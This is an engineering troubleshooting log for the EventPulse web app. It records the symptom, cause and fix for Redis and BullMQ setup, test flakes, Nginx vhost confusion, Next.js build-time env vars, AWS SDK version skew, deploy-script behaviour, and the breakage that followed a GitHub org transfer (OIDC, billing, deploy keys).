Errors swallowed because Redis-absent is not a fatal boot condition (each consumer handles its own absence path).

**Why warm-up vs `enableOfflineQueue: true`.** Flipping to `true` would queue commands while connecting — fine for idempotency but DEFEATS the Day-26-intentional fail-fast on the EPS token cache (a slow Redis would hang token fetches indefinitely). Warm-up preserves both invariants: idempotency works on the first request AND EPS token cache stays bounded.

**How to avoid.**

1. Any singleton with `lazyConnect: true` + `enableOfflineQueue: false` needs an explicit `connect()` at boot if ANY consumer queries it on the request hot path.
2. Post-deploy smoke MUST exercise the first-request-after-reload case. The `pm2 reload api` simulates a cold start; the subsequent curl validates the warm-up worked.

---

## `ioredis-mock` shares data across `new RedisMock()` instances — per-test unique keys required (2026-05-25 / Day 29 Phase 1)

**Symptom.** A unit test in the idempotency middleware suite ("three sequential replays all return identical body; handler runs only ONCE") failed with `expected spy to be called 1 times, got 0 times`. Sibling tests using DIFFERENT keys passed.

**Why it happens.** `ioredis-mock` documents that `new RedisMock()` instances SHARE the same underlying in-memory data store by default. The test's `beforeEach` replaced the singleton with a "fresh" mock via `_setRedisClientForTest(new RedisMock())`, but writes from the previous test (which used the same Redis KEY constant) persisted into the new mock. The middleware found the cached entry from a prior test and returned the cached response without calling the handler.

**Fix.** Per-test unique KEY suffixes (e.g. `'happy-path-1-12345'`, `'happy-path-2-12345'`, `'reuse-key-1-12345'`). The data-share is unavoidable without a deeper mock-reset; the test discipline is to avoid cross-test key collisions.

**How to avoid.** When writing tests against `ioredis-mock`, use a fresh key per `it()` block. The `describe`-level shared KEY constant pattern (which works against real Redis when the test framework spins up isolated databases) is unsafe with the mock.

---

## BullMQ Worker requires `maxRetriesPerRequest: null` on its Redis connection — incompatible with the bounded singleton (2026-05-25 / Day 28 Phase 3)

**Symptom.** PR #168 first push crashed CI E2E job at API boot:

```
Error: BullMQ: Your redis options maxRetriesPerRequest must be null.
    at RedisConnection.checkBlockingOptions
    at new Worker
    at startDeliveryWorker (apps/api/src/workers/delivery-worker.ts:63:13)
    at <anonymous> (apps/api/src/index.ts:24:1)
```

The API process never reached `listen()` because the worker startup crashed in `index.ts` at module-load time. Playwright's WebServer timed out waiting 120s. All other tests (unit, integration, CodeQL, build, lint, format) had passed — the failure was a real CI-only regression that local unit tests couldn't catch because we used `_setRedisClientForTest(null)` to skip the real-Redis path.

**Why it happens.** BullMQ uses blocking Redis commands (`BRPOPLPUSH`, `XREAD`) that hold the connection open indefinitely waiting for a job. Bounded retries would let ioredis abandon the blocking command early, and BullMQ would lose track of jobs. So BullMQ refuses to construct a Queue/Worker with anything other than `maxRetriesPerRequest: null`.

The singleton at `apps/api/src/infra/redis/client.ts` (used by the EPS token cache) sets `maxRetriesPerRequest: 2` — bounded so a slow Redis can't hang the EPS init path. Different threat model: GET/SETEX in the cache benefits from bounded retries; blocking commands in BullMQ don't.

**Fix (Day 28 Phase 3).** New `getBullRedis()` factory in `apps/api/src/workers/delivery-queue.ts` that mints a SEPARATE ioredis instance with `maxRetriesPerRequest: null`. Both Queue (producer) and Worker (consumer) consume this dedicated connection. Singleton stays bounded for the EPS path. Cost of a second TCP socket is operationally trivial.

**How to avoid.** Any new BullMQ surface (refunds queue, disbursement queue) reuses `getBullRedis()` from `workers/delivery-queue.ts` — single source of truth for the BullMQ connection. Do NOT plumb the singleton (`getRedis()`) into BullMQ constructs; the typecheck will pass but boot will crash. The `decisions.md` "Day 28 architectural choices" Choice D pins the rationale.

---

## Fixed-window rate limiters flake under increased test load (real time crosses bucket boundary mid-test) (2026-05-25 / Day 28 Phase 3 hotfix)

**Symptom.** PR #168 second-push CI: unit test `webhook route — IP rate-limit > different IPs have independent IP budgets` failed:

```
AssertionError: expected undefined to be true // Object.is equality
- Expected: true
+ Received: undefined
```

The test fires 101 requests to a single IP and expects the 101st to be `throttled: true`. Under the Phase 3 test workload (more tests = slower per-test wall-clock progress), the 100th and 101st requests landed in different fixed-window buckets and the budget reset — the 101st was allowed (throttled: undefined) instead of throttled.

**Why it happens.** The rate-limit primitive at `apps/api/src/lib/rate-limit.ts` buckets requests by `Math.floor(Date.now() / windowMs) * windowMs`. With `windowMs=60000` (1 minute), the bucket changes every wall-clock minute boundary. Without frozen time, a slow CI runner can push hits 100 and 101 across the boundary and the test silently fails.

This is a PRE-EXISTING flake from Day 27 — it just hadn't surfaced because the test suite was smaller. Phase 3 added enough tests that the cumulative time pushed the test across a wall-clock minute often enough to fail.

**Fix.** `vi.useFakeTimers({ now: ... })` in the two affected `describe` blocks (`webhook route — IP rate-limit` and `webhook route — txn-id rate-limit`). Frozen time = deterministic bucket = test always within the same window. Doesn't change limiter semantics; gives the test a stable clock.

**How to avoid.** Any test that exhausts a fixed-window or fixed-interval budget MUST freeze time. Add `vi.useFakeTimers()` in `beforeEach` + `vi.useRealTimers()` in `afterEach` of the describe block. The limiter's clock injection (`opts.now`) is also available for direct injection but `vi.useFakeTimers` is the path of least resistance.

---

## SSM probes need exact paths: `.env.staging` lives at `/home/eventpulse/`, NOT `/home/eventpulse/app/` (2026-05-25 / Day 28 Phase 0)

**Symptom.** Day 28 Phase 0 first SSM block-invariant probe returned `NOT_IN_PM2` for `pm2 env 0` and `NOT_IN_ENV_FILE` for `grep ... /home/eventpulse/app/.env.staging`. Looked like the STAGING_PAYMENT_BLOCK invariant had been silently broken — was actually a wrong-probe-path issue.

**Why it happens.** Two issues stacked:

1. **pm2 process IDs are zero-indexed but not predictable by name.** PM2 list shows `id=0 → web` and `id=1 → api`. STAGING_PAYMENT_BLOCK is in the API env, not the web env. `pm2 env 0` returns the WEB env which doesn't have the variable. Need `pm2 env 1` (or look it up by name first).
2. **`.env.staging` lives at `/home/eventpulse/.env.staging`, NOT `/home/eventpulse/app/.env.staging`.** The bootstrap-staging.sh writes to the eventpulse user's home directory, not the app deploy directory. The deploy directory has `.env.example` only.

**Fix.** Probe both: `sudo -u eventpulse pm2 env 1 | grep STAGING_PAYMENT_BLOCK` AND `sudo grep STAGING_PAYMENT_BLOCK /home/eventpulse/.env.staging`. Confirms both pm2 env + on-disk env file.

**How to avoid.** Future block-invariant probes use the verified path. If the deploy infrastructure ever moves the env file (unlikely), `pm2 describe 1` shows the env file path in JSON output as a fallback.

---

## PM2 log paths: `/home/eventpulse/logs/api.out.log`, NOT `/home/eventpulse/.pm2/logs/` (2026-05-25 / Day 28 Phase 4)

**Symptom.** Day 28 Phase 4 staging worker-boot probe via `sudo -u eventpulse pm2 logs api --lines 200 --nostream | grep delivery_worker` returned NO_MATCH. Suggested the worker hadn't started. Investigation showed `/home/eventpulse/.pm2/logs/` was empty (`total 8` — just `.` and `..`).

**Why it happens.** PM2 was configured to log to `/home/eventpulse/logs/` instead of the default `~/.pm2/logs/`. This was likely set at Sprint 1 Day 9-10 PM2 ecosystem setup. `pm2 logs <name>` reads from PM2's internal log buffer but on some configurations this can be sparse or filtered; the on-disk file is the durable record.

**Fix.** Probe the on-disk file directly: `sudo tail -300 /home/eventpulse/logs/api.out.log | grep tickets.delivery_worker`. Once probed correctly, the worker boot signal was clearly present:

```json
{"queue":"tickets-delivery","concurrency":2,"msg":"tickets.delivery_worker.started"}
```

**How to find next time.** `sudo -u eventpulse pm2 jlist | python3 -c "import json,sys; d=json.load(sys.stdin); print([(p.get('name'), p.get('pm2_env',{}).get('pm_out_log_path')) for p in d])"` returns the actual log file paths from PM2's process config. This is the definitive lookup.

---

## API routes live ONLY on `api.staging` vhost — hitting them on the web vhost returns Next.js 404 HTML (2026-05-24)

**Symptom.** User reports `https://staging.eventpulse.com.bd/api/v1/auth/oauth/google/start` "not working." Curl shows:

```text
HTTP/2 404
content-type: text/html; charset=utf-8
x-nextjs-cache: HIT
x-nextjs-prerender: 1
```

Body is a Next.js 404 HTML page — not the structured `{"error":{"code":"OAUTH_NOT_CONFIGURED",...}}` shape the Hono API would have returned. The user sees a generic browser 404 and assumes the OAuth endpoint is broken.

**Why it happens.** The staging Nginx config (`infra/nginx/eventpulse-staging.conf`) has **two separate vhosts**:

1. `staging.eventpulse.com.bd` (and `app.`, `admin.`, `my.`) → proxies to **Next.js on :3000** — handles all web pages + `app/api/*` routes that Next.js defines (Trust Center revalidation hooks, etc.).
2. `api.staging.eventpulse.com.bd` → proxies to **Hono on :4000** — handles all `/api/v1/*` routes (auth, OAuth, tenant, admin, public legal).

When a request for `/api/v1/auth/oauth/google/start` hits the WEB vhost, Nginx forwards it to Next.js, which has no route at that path → Next.js's catch-all 404 page (HTML). When the same path hits the API vhost, Nginx forwards it to Hono, which returns the route's response (503 OAUTH_NOT_CONFIGURED or 302 redirect depending on env).

The frontend OAuth button is supposed to use `NEXT_PUBLIC_API_BASE_URL` to produce an absolute URL pointing at `api.staging.eventpulse.com.bd`. When that env var is unset at build time, the button falls back to a relative path which resolves against the web vhost — reproducing exactly the user's 404 (see next entry).

**Fix.**

- When a user reports an "API endpoint not working," **first verify which vhost they hit**. Curl both:
  ```bash
  curl -s -o /dev/null -w "%{http_code}\n" https://staging.eventpulse.com.bd/api/v1/auth/oauth/google/start
  # 404 = Next.js — wrong vhost
  curl -s -o /dev/null -w "%{http_code}\n" https://api.staging.eventpulse.com.bd/api/v1/auth/oauth/google/start
  # 503 (or other structured response) = Hono — correct vhost
  ```
  Different status codes from different vhosts on the same path is the signature.
- **API routes belong on `api.staging.eventpulse.com.bd` only.** Never link to `/api/v1/*` from the web vhost as a relative path; always use the absolute `NEXT_PUBLIC_API_BASE_URL` prefix.

**How to avoid future occurrences:**

- Frontend code that hits the API MUST use absolute URLs via `NEXT_PUBLIC_API_BASE_URL` (see `apps/web/src/hooks/use-admin-kyc.ts` `apiBase()` for the canonical pattern). The OAuth button in `apps/web/src/components/auth/oauth-button-group.tsx` is the load-bearing example.
- Production vhost layout will mirror staging: `eventpulse.com.bd` for web, `api.eventpulse.com.bd` for Hono. The same vhost-confusion class of bug applies — same diagnosis applies.

---

## `NEXT_PUBLIC_API_BASE_URL` missing at Next.js build time silently renders relative OAuth href (2026-05-24)

**Symptom.** OAuth button on `https://staging.eventpulse.com.bd/sign-in` clicks through to a Next.js 404 HTML page instead of redirecting to Google. The HTML rendered to the page contains:

```html
<a href="/api/v1/auth/oauth/google/start" data-testid="oauth-google-button">
```

— a **relative** path that resolves against the web vhost. Per the gotcha above, the web vhost has no such route, so Next.js returns 404 HTML.

The frontend code (`apps/web/src/components/auth/oauth-button-group.tsx`) is correct — it reads `NEXT_PUBLIC_API_BASE_URL` and produces an absolute URL when the env var is set. The bug is at the BUILD layer.

**Why it happens.** Next.js inlines `NEXT_PUBLIC_*` env vars at **build time** via static analysis. They MUST be set as environment variables when `pnpm build` runs — setting them at runtime in `.env.production` or via PM2's `env:` block has NO effect; the built bundle already has whatever value (or empty string fallback) was available at compile.

If `NEXT_PUBLIC_API_BASE_URL` is missing from the build environment:
- `process.env['NEXT_PUBLIC_API_BASE_URL']` evaluates to `undefined` at build time
- The fallback `?? ''` produces empty string
- The button href becomes `'' + '/api/v1/auth/oauth/google/start'` = `/api/v1/auth/oauth/google/start` — relative
- Browser resolves against current host (web vhost) → wrong vhost → 404

`deploy.sh` step 0 sources `/home/eventpulse/.env.staging` into the bash environment via `set -a; source "$ENV_FILE"; set +a` BEFORE running pnpm build. So if `NEXT_PUBLIC_API_BASE_URL` is in `.env.staging`, the build picks it up. **If the env var is missing from the bootstrap-staging.sh output, the variable is never set at build time** and every Next.js build silently bakes in the relative-path bug.

**Fix.**

1. Confirm the env var is in `/home/eventpulse/.env.staging` on the EC2:
   ```bash
   aws ssm start-session --target i-02e4fddeb923c14f9
   grep NEXT_PUBLIC_API_BASE_URL /home/eventpulse/.env.staging
   ```
2. If missing, add it via the standard secret-rotation flow (Secrets Manager entry → bootstrap-staging.sh refresh → trigger redeploy so the next Next.js build picks it up).
3. After the next deploy, verify the rendered HTML:
   ```bash
   curl -s https://staging.eventpulse.com.bd/sign-in | grep -oE 'href="[^"]*oauth[^"]*"'
   # Should print: href="https://api.staging.eventpulse.com.bd/api/v1/auth/oauth/google/start"
   # NOT: href="/api/v1/auth/oauth/google/start"
   ```

**How to avoid future occurrences:**

- `bootstrap-staging.sh` should validate that `NEXT_PUBLIC_API_BASE_URL` is set after materialising `.env.staging`; refuse to exit success if it's empty. (Adding this validation is a tracked follow-up.)
- Any new `NEXT_PUBLIC_*` env var added to the frontend MUST land in Secrets Manager + bootstrap-staging.sh + .env.example in the same PR. The frontend code that consumes it can ship before the env arrives — but the consumer should log a build-time warning if the value is empty, so deploys don't silently bake in the bug.
- The OAuth-button test suite in `oauth-button-group.test.tsx` exercises both the unset-env (renders relative path) and set-env (renders absolute) paths. The set-env path is the production contract.

---

## react-hook-form + zod schema with `.pipe(z.coerce.date())` produces unresolvable Resolver type mismatch (2026-05-24)

**Symptom.** Using `useForm<EventCreateInput>` with `resolver: zodResolver(EventCreateSchema)` where `EventCreateSchema` uses `z.string().datetime().pipe(z.coerce.date())` for date fields produces TS2719:

```text
Type 'Resolver<{ ... startsAt: string; ... }>' is not assignable to type
'Resolver<{ ... startsAt: Date; ... }>'.
Two different types with this name exist, but they are unrelated.
```

The two `Resolver<T>` types are structurally distinct because their `T` differs on the `startsAt` field (string vs Date).

**Why it happens.** zod's pipe operator transforms the schema's INPUT type and OUTPUT type independently:

- INPUT type (what the form submits): `string` (from `z.string().datetime()`)
- OUTPUT type (what the resolver returns after coercion): `Date` (from `z.coerce.date()`)

`useForm<TFieldValues>` infers `TFieldValues` from `defaultValues` (which we want to be string-shaped because HTML `<input type="datetime-local">` returns strings). `zodResolver(schema)` returns a `Resolver<schema.output>`. The two don't unify when the input and output diverge.

**Fix.**

Two options:

1. **Cast at the resolver seam** (used in `apps/web/src/components/tenant/event-form-templates/event-form.tsx`):
   ```typescript
   import { useForm, type Resolver } from 'react-hook-form'
   type FormShape = z.input<typeof EventCreateSchema>
   useForm<FormShape>({
     resolver: zodResolver(EventCreateSchema) as unknown as Resolver<FormShape>,
     defaultValues: { ... string-shaped ... },
   })
   // Then in the submit handler, cast the values back to the output shape:
   handleSubmit((values) => onValidSubmit(values as unknown as EventCreateOutput))
   ```
   The runtime is correct — the resolver coerces on submit before the handler runs. The cast is a typing bridge between the form's input-shape and the API's output-shape.

2. **Drop the pipe in the schema.** Use plain `z.string().datetime()` and let the service-layer convert to Date. This matches the §6.1 playbook example (which uses string-typed date fields server-side). Trade-off: every service-layer call site has to remember to `new Date(input.startsAt)`.

The cast approach is chosen for the events form because:
- Service layer wants Date (cleaner ergonomics for `validateTransition` + date comparisons)
- Form layer wants string (HTML input contract)
- Schema bridges both via the pipe; the cast acknowledges TypeScript can't represent both sides simultaneously without explicit help

**How to avoid future occurrences:**

- When a zod schema uses pipe + coerce, document the input vs output types in a comment above the schema definition.
- When binding a form to such a schema, ALWAYS pass `z.input<typeof Schema>` as the `useForm` TFieldValues + cast the resolver. Don't use `z.infer<typeof Schema>` (which is the output) — it produces the same TS2719 with a different decoration.
- Reach for option 2 (drop the pipe) when the service layer doesn't actually need Date — string-passthrough is simpler.

---

## AWS SDK v3 packages share smithy internal Client types — must bump together (2026-05-24)

**Symptom.** Bumping `@aws-sdk/client-s3` alone (or `@aws-sdk/s3-request-presigner` alone) to a newer patch version while the sibling stays back produces a typecheck failure on the s3-presigner boundary:

```text
src/infra/s3/client.ts(198,40): error TS2345:
  Argument of type 'S3Client' is not assignable to parameter of type
  'Client<any, ServiceInputTypes, MetadataBearer, any>'.
  Types have separate declarations of a private property 'handlers'.
```

The same pattern hit Dependabot PRs #131 (`client-s3` patch alone) and #133 (`s3-request-presigner` patch alone) during the 2026-05-24 consolidation session — each failed CI individually with this exact error.

**Why it happens.** `@aws-sdk/*` packages share an internal smithy `Client` class via the `@smithy/types` package transitively. The `handlers` field is a **private class member**, and TypeScript treats two versions of the same private class member as structurally distinct (private fields are nominal in TypeScript, not structural). When `client-s3` and `s3-request-presigner` versions diverge, the presigner's expected `Client<...>` parameter type and the `client-s3` instance's class identity mismatch on `handlers`. The diagnostic is misleading — you read "S3Client is not Client" and assume an API change, but the real issue is two copies of the same `Client` class from different package versions.

Fix one alone, CI breaks on main. Fix the other alone, CI breaks on main. Both must move together.

**Fix.**

1. **Always bump `@aws-sdk/*` packages as a group.** Either combine the bumps locally into one PR (the pattern used for the 2026-05-24 PR #136 recovery) or rely on Dependabot grouping to do it automatically. Recovery command for an already-stuck pair:

   ```bash
   pnpm --filter <app> update @aws-sdk/client-s3@<version> @aws-sdk/s3-request-presigner@<version>
   # Then commit lockfile + package.json together in one PR
   ```

2. **Dependabot grouping config.** `.github/dependabot.yml` carries an `aws-sdk` group matching `@aws-sdk/*` with `update-types: [minor, patch]` (added 2026-05-24 in PR #136). Going forward, Dependabot opens ONE PR per AWS SDK family bump instead of N separate PRs that each break CI. Majors stay ungrouped (review by hand) because they often retitle exports.

**Verification of the grouping config** (2026-05-24 same day): Dependabot ran its next cycle 3 hours after #136 merged and opened **PR #137 — "bump the aws-sdk group across 1 directory with 2 updates"**, confirming the grouping works. Standalone `client-sesv2` PR (#134) auto-closed itself as part of consolidating into the group.

**How to avoid future occurrences:**

- If you see `TS2345` with "separate declarations of private property 'handlers'" anywhere in AWS-SDK-adjacent code, it's a version skew between sibling `@aws-sdk/*` packages. Check `package.json` for divergent minor versions across the family.
- Never bump a single `@aws-sdk/*` package independently. If you need to bump one, bump all of them at the same minor.
- The grouping config is **load-bearing** — removing it re-exposes every cycle to the same N-separate-PRs-each-failing-CI pattern.

**Cross-reference:** PR #136 (2026-05-24 combined bump + grouping config) is the canonical fix recipe. Confirmation that grouping works: PR #137 (Dependabot's first grouped aws-sdk PR after the config landed). Decisions entry in `.claude/memory/decisions.md` "Pre-Day-23 consolidation session" if extended docs are needed.

---

## Self-modifying deploy/bootstrap scripts don't take effect on the deploy that ships them (2026-05-24)

**Symptom.** PR #127 changed `infra/deploy/deploy.sh` to add Fix 6b's conditional Nginx reload. After merge, the auto-deploy fired and succeeded — but the deploy log showed NO trace of the new Fix 6b code paths (no "previous HEAD was..." line, no "no nginx vhost changes; skipping nginx reload" line). The new `deploy.sh` was on disk; it just hadn't run.

**Why it happens.** Bash loads the entire script into memory at process start, then runs to completion from that loaded copy. By the time `deploy.sh` does its `git fetch + git reset --hard <new TARGET>`, the new version of itself is on disk — but the running bash process is still executing the OLD copy. Sequence:

1. CI invokes `deploy.sh` via SSM `SendCommand`
2. Bash loads the OLD `deploy.sh` into its process memory
3. Old `deploy.sh` runs: `git fetch + git reset --hard <new commit>` (NEW `deploy.sh` now on disk)
4. Old `deploy.sh` continues from memory: install / build / migrate / pm2 reload / healthcheck
5. Old `deploy.sh` exits cleanly
6. NEW `deploy.sh` sits on disk, unexercised
7. The NEXT deploy (whatever fires next) is the first to run the new code

**Empirical verification (2026-05-24):**

- 13:32 PR #127 merge → push-event deploy → ran OLD `deploy.sh` → no Fix 6b markers in log
- 13:44 fresh `workflow_dispatch` deploy → ran NEW `deploy.sh` → both Fix 6b markers present:

  ```text
  checked out 01207a4 (from ref=01207a48...; previous HEAD was 01207a48...)
  no nginx vhost changes; skipping nginx reload
  ```

**Fix.** When shipping a change to `deploy.sh` (or any other self-modifying deploy/bootstrap script):

1. Merge the PR that ships the change.
2. **Fire a second deploy** (`gh workflow run deploy-staging.yml --ref main` or whatever triggers it) to actually exercise the new script.
3. Verify the second deploy's log shows the expected new behavior.

A single PR merge is NOT sufficient to verify a `deploy.sh` change — you need TWO deploys: the one that ships the file, and the next one that runs it.

**How to avoid future occurrences:**

- When reviewing a `deploy.sh` PR, add "fire a follow-up workflow_dispatch deploy after merge to verify the new logic" to the PR description's test plan.
- The same caveat applies to `infra/scripts/bootstrap-staging.sh`, `rollback.sh`, and any other shell script invoked via SSM `SendCommand`. Bootstrap and rollback are less frequently exercised so the gotcha is even more likely to be missed there.
- If you can't tell whether the new or old version of the script ran, grep the deploy log for a marker line unique to the new version (e.g. a new echo statement). Absence of that marker = old version ran.

**Related — Sprint 2 silent-failure pattern.** This is structurally similar to the Sprint 2 silent-partial-failure pattern that took 5 working days to surface: observability of a code path requires probes that exercise the actual code path, not layer-of-abstraction shortcuts. Here, "the script changed" doesn't mean "the new script ran" — you need a probe (the next deploy) that actually exercises the new code.

---

## GitHub repo transfer cascades through THREE owner-scoped trust relationships (2026-05-20 / -21)

**TL;DR.** Transferring a repo to a new GitHub org breaks **three** independent owner-scoped trust relationships in sequence. Fix one, the next surfaces. The three are: **(1) OIDC trust policy** (`sub` + `job_workflow_ref` carry the owner name; AWS IAM rejects AssumeRole until updated); **(2) Actions billing entity** (new org has its own 2,000-min Free-tier allowance + its own Free-tier default $0 spending limit; a limit set on the previous owner does NOT carry over); **(3) Deploy keys** (org-level policy can disable deploy keys; transferred keys can land in a stale-metadata state that authenticates on the SSH greeting but rejects `git-upload-pack`). When migrating a repo to a new org, check + fix all three before expecting deploys to work. Each surfaces only after the prior is resolved, so a one-at-a-time debugging session burns hours; the runbook below is the consolidated three-layer fix.

**Context.** Pre-Day-23 consolidation resumption discovered the cascade after the GHA quota outage resolved. Repo was transferred from personal account `publicpulseagency` to new org `The-Public-Pulse-Agency` during the outage window. GitHub HTTP-redirects URLs at the API/web layer so `git push`, `gh`, and browser links kept working without ceremony — but three lower layers carry the owner name as a verbatim claim or as a separate-entity reference, and each broke independently:

### Layer 1 — OIDC trust policy

**Symptom:** Deploy job fails at `aws-actions/configure-aws-credentials@v4` with `Could not assume role with OIDC: Not authorized to perform sts:AssumeRoleWithWebIdentity`. CI itself runs fine — only AWS-touching jobs fail.

**Why it happens.** The OIDC tokens GitHub mints for Actions jobs use the **new canonical org login** in both `sub` (`repo:OWNER/REPO:environment:NAME`) and `job_workflow_ref` (`OWNER/REPO/.github/workflows/FILE@refs/heads/BRANCH`) claims. The canonical login is the lowercase URL-path identifier, NOT the display name. It updates the instant the transfer completes. Exact-match trust policies (the project's canonical three-claim pattern per CLAUDE.md §17.9.1) reject the mismatched claims cleanly. HTTP redirects only mask the change at the API/web layer; OIDC consumes the new value directly.

**Fix.** For every `eventpulse-deploy-<env>` role in AWS, replace the old owner name with the new owner name on both `sub` and `job_workflow_ref` claims:

```bash
TMP=$(mktemp -t trust-policy) && cat > "$TMP" <<'JSON'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "GitHubActionsOIDCStagingDeployWorkflowOnMain",
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::739275468267:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:The-Public-Pulse-Agency/EventPulse:environment:staging",
        "token.actions.githubusercontent.com:job_workflow_ref": "The-Public-Pulse-Agency/EventPulse/.github/workflows/deploy-staging.yml@refs/heads/main"
      }
    }
  }]
}
JSON
aws iam update-assume-role-policy --role-name eventpulse-deploy-staging --policy-document "file://${TMP}" --profile eventpulse --region ap-southeast-1
rm -f "$TMP"
```

Option A (replace, not arrays) — the old owner name will never authenticate again. Pattern stays exact-match, no `StringEquals` arrays, no `StringLike`. Apply identically to `eventpulse-deploy-prod` whenever it's created.

Also update `infra/scripts/setup-github-oidc.sh` so a re-run doesn't regress to the old owner name in its default `GITHUB_REPO`. And update `CLAUDE.md` §17.9.1 example JSON to match the new owner.

### Layer 2 — Actions billing entity

**Symptom.** CI works again after the layer 1 fix, but the underlying quota concern is hidden. The new org gets its own fresh 2,000-min Free-tier allowance the instant the repo lands in it — making the immediate post-transfer state appear "fine" — but any spending limit set on the prior owner's account does NOT follow the repo. Once the new org's monthly minutes exhaust, the 3-second-failure-on-runner-pickup pattern from the prior GHA outage gotcha recurs.

**Why it happens.** Billing entities are per-account. Personal-account spending limits, payment methods, and consumption metering all stay with the personal account when a repo transfers out. Org-level Actions billing is configured independently. The Free-tier default for orgs is $0 spending limit — meaning the moment the org's 2,000 included minutes burn through, every job fails at runner-allocation time.

**Fix.** Set a non-zero spending limit on the new org. Browser-only path:

```text
https://github.com/organizations/NEW-ORG/settings/billing/summary
```

The legacy `GET /orgs/{org}/settings/billing/actions` REST endpoint returns 410 Gone (moved per <https://gh.io/billing-api-updates-org>). The new API also requires the `admin:org` scope. `gh auth refresh -h github.com -s admin:org` adds it for future automation.

### Layer 3 — Deploy keys

**Symptom A:** `git-upload-pack` returns `ERROR: Repository not found` from the EC2 even though `ssh -T git@github.com` reports `Hi ORG/REPO! You've successfully authenticated`. (The greeting is a "what does this key belong to" RPC that completes against the deploy-key metadata; the upload-pack endpoint actually checks per-repo permission grants and rejects.)

**Symptom B:** Attempting to delete + re-add the same public key returns `Validation Failed - Deploy keys are disabled for this repository` (HTTP 422) — pointing at an org-level policy, not a repo-level one.

**Why it happens.** When a repo transfers to a new org, two things can go wrong with deploy keys independently:

1. **The org may have `deploy_keys_enabled_for_repositories: false`.** This is an org-level security policy (Settings → Member privileges → Deploy keys). If the policy is disabled, NO repo in the org can have deploy keys — the SSH-greeting auth path still works (it's not feature-gated by this flag) but `git-upload-pack` rejects per-repo because the per-repo permission grant requires the feature to be enabled.
2. **The transferred key metadata can land in a stale, non-functional state.** GitHub carries the deploy-key entry over (visible via `gh api /repos/NEW-ORG/REPO/keys`) but the underlying permission grant doesn't actually transfer cleanly. The key appears present + verified but fails real git operations. Delete + re-add of the same public key restores the permission grant — but only if the org-level feature is enabled.

**Fix (two-step).**

1. **Enable deploy keys at the org level.** Browser: Settings → Member privileges → Deploy keys → enable → Save. Or API (needs `admin:org` scope):

   ```bash
   gh api -X PATCH /orgs/NEW-ORG -F deploy_keys_enabled_for_repositories=true
   ```

   Verify: `gh api /orgs/NEW-ORG --jq .deploy_keys_enabled_for_repositories` returns `true`.

2. **Delete the stale key entry, re-add the same public key fresh.** The public key is unchanged; only the per-repo grant needs to be recreated. Stale entries surface via `gh api /repos/NEW-ORG/REPO/keys` as present-but-non-functional. Sketch (substitute real owner/repo + key body):

   ```bash
   gh api /repos/NEW-ORG/REPO/keys --jq '.[].id' | while read id; do
     gh api -X DELETE /repos/NEW-ORG/REPO/keys/$id
   done
   # Then POST a fresh entry with the same public key body.
   # Avoid heredoc-inside-heredoc rendering issues: build the JSON payload
   # in a temp file with mktemp, then `gh api -X POST ... --input "$TMP"`.
   ```

3. **Update the EC2's git remote URL** to the new owner (`git remote set-url origin git@github.com:NEW-ORG/REPO.git`). Old URL is dead even though HTTP redirects mask it for browser/CLI; SSH-protocol git operations bypass the redirect.

**Real test (not `ssh -T`).** `ssh -T git@github.com` reports auth-success even when the actual permission grant is broken. The truth-revealing test is from the EC2 itself:

```bash
sudo -u eventpulse git -C /home/eventpulse/app ls-remote origin HEAD
```

A real SHA in stdout = working. Anything else = layer 3 still broken.

### How to avoid future occurrences

- **Before any repo transfer:** audit all THREE layers explicitly. Don't assume any of them survives the transfer cleanly. Document the layer-by-layer state pre-transfer so the post-transfer recovery script is one-pass.
- **After any repo transfer:** treat the first deploy attempt as a controlled probe of all three layers. The OIDC error surfaces first (loudest); fix it and the billing concern is silent until the org's first quota cycle; the deploy-keys break hides behind the OIDC fix and surfaces only on the first auto-deploy.
- **Test each layer with the truth-revealing call**, not the friendly one. OIDC: the actual deploy run, not a workflow_dispatch on an unrelated workflow. Billing: the org's `/settings/billing/summary` page directly, not "is CI running today?" Deploy keys: `git ls-remote origin HEAD` from the EC2, not `ssh -T git@github.com`.
- **Org login vs display name.** Always copy from the URL path (lowercase canonical login), never from the org's display name. OIDC + git remote URLs + `${{ github.repository }}` substitutions all use the canonical login. Display names are decorative.
- **Don't rely on GitHub HTTP redirects to mask owner-name changes.** They only help layers that talk to the GitHub API/web/git-over-HTTPS. SSH-protocol git operations, OIDC tokens, IAM trust policies, webhook payloads using `${{ github.repository }}` strings, and scripts pinning the owner name all break silently.

**Cross-reference:** `.claude/memory/decisions.md` "Org migration — publicpulseagency → The-Public-Pulse-Agency" (2026-05-20, canonical source) + the prior canonical OIDC pattern (decisions.md 2026-05-17 "Canonical GitHub Actions → AWS OIDC trust pattern (project standard)") which the org-migration leaves intact at the pattern level (still three claims, still exact-match, still no arrays — only the owner-login value moves).

---

## GitHub Actions org-wide failure — runs fail in ~3s right after runner pickup, no step logs (2026-05-20 pre-Day-23)

**Symptom:** Every GHA workflow (`ci.yml`, `commitlint.yml`, `deploy-staging.yml`) started failing at 19:01 UTC on 2026-05-19. Failure pattern: runner picks up the job ("Job is about to start running on the hosted runner: GitHub Actions 1000001774"), then immediate failure ~2 seconds later, conclusion=`failure`, **zero steps recorded**, no step-level logs available (`gh run view --log-failed` returns `log not found`). Last successful run was PR #126 CI at 18:58 UTC; first failure was PR #127 CI at 19:01 UTC. Affects `push`, `pull_request`, and `workflow_dispatch` events equally. Re-running a failed run does not queue a new attempt — the same run remains in `failure` state.

**Diagnostic shape:** System log (downloadable via `curl -L /actions/runs/<id>/attempts/1/logs`) shows only:

```text
Evaluating deploy.if
Result: true
Requested labels: ubuntu-latest
Job defined at: …/deploy-staging.yml@refs/heads/main
Waiting for a runner to pick up this job...
Job is about to start running on the hosted runner: GitHub Actions 1000001774
```

…then nothing. No `actions/checkout@v4` step start, no setup logs. The runner is allocated but then the job dies before the first step's container can execute.

**Confirmed cause: GitHub Free-tier 2,000-minute org-level Actions quota exhausted with the spending limit pinned at $0.** PublicPulseAgency is an organisation on Free tier; the Sprint 2 + early Sprint 3 push volume exhausted the included 2,000 monthly minutes mid-billing-cycle. With the spending limit at the Free-tier default of $0, GitHub's billing layer rejected every job at runner-allocation time — exactly matching the 3-second-failure-with-no-steps pattern. The deploy + CI workflows queue, the scheduler tries to allocate a runner, then billing aborts before any step container starts.

